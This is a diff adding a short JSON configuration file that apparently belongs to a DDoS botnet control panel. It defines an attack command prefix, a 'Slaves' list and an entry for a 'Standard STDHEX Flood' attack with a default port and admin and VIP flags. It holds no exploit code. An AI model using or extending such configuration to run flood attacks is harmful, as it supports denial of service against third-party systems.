@@ -1,0 +1,14 @@
+{
+    "AttackPrefix" : "!",
+    "Slaves" : [
+        
+        {
+            "ID" : 3,
+            "Name" : "std",
+            "Description" : "Standard STDHEX Flood",
+            "DefaultPort" : "998",
+            "Admin" : true,
+            "Vip" : false
+        }
+    ]
+}
